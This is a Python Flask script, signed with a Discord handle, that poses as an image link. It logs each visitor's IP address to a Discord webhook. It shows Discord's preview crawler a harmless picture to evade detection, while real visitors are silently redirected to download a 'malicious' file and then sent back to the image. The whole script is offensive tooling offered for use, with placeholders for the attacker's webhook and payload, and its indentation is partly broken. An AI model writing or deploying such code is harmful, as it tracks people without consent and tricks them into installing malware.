# Made by Marcc#0001
# Ricolet is anywhere!

import requests, io
from flask import Flask, request, send_file
from discord_webhook import DiscordWebhook

 app = Flask(
__name__,
  template_folder='templates',
  static_folder='static'
)
@app.route('/', methods=['GET'])
def main():
  Image = 'Your Picture' # Replace with your Picture
  Malicious = 'download link'# Replace with download link
  # This is to get the ip
  if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
    ip = request.environ['REMOTE_ADDR']
  else:
    ip = request.environ['HTTP_X_FORWARDED_FOR']
    webhook = DiscordWebhook(url='Your webhook', rate_limit_retry=True,
     # Your webhook to get the IP's!
     # If u want to keep the IP's private make a private Webhook!
                         content=f'@everyone someone clicked on the ip grabber : {ip}')
  response = webhook.execute()

  if ip.startswith('35.') or ip.startswith('34.'):
    # If discord is getting a link preview send a image
    return send_file(
    io.BytesIO(requests.get(Image).content),
    mimetype='image/jpeg',
    attachment_filename='s.png')
  else:
    # If a real person is clicking the link send a malicious file and redirect back to the image
    return f'''<meta http-equiv="refresh" content="0; url={Malicious}">
               '''+'''
          <script>setTimeout(function() {
            ''' + f'window.location = "{Image}"''''
          }, 500)</script>'''
          # File downloader
if __name__ == '__main__':
  # Run the Flask app
  app.run(
  host='0.0.0.0',
  debug=True,
  port=54370
  )
